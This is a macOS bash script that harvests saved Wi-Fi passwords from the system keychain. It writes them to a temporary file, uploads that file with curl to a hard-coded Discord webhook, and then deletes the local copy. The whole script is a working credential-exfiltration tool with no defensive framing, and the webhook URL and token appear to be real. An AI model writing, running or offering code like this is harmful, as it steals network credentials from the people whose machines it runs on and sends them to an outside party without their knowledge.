#!/bin/bash

# Variables
dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
temp_file="/tmp/wifi-pass.txt"

# Function to upload files to Discord
function discord_upload() {
  local file_path=$1

  curl -s -X POST "$dc" \
    -F "username=$(whoami)" \
    -F "file1=@$file_path"
}

# Retrieve Wi-Fi passwords
echo "Script started" > "$temp_file"
echo "Gathering Wi-Fi profiles..." >> "$temp_file"

networks=$(networksetup -listpreferredwirelessnetworks en0 | sed '1d')

for network in $networks; do
  password=$(security find-generic-password -D "AirPort network password" -wa "$network" 2>/dev/null)
  if [[ -n "$password" ]]; then
    echo "Network: $network | Password: $password" >> "$temp_file"
  else
    echo "Network: $network | Password: Not found" >> "$temp_file"
  fi
done

# Upload to Discord
echo "Uploading to Discord..."
discord_upload "$temp_file"
echo "Upload to Discord completed"

# Cleanup
echo "Cleaning up..."
rm "$temp_file"
echo "Cleanup completed"
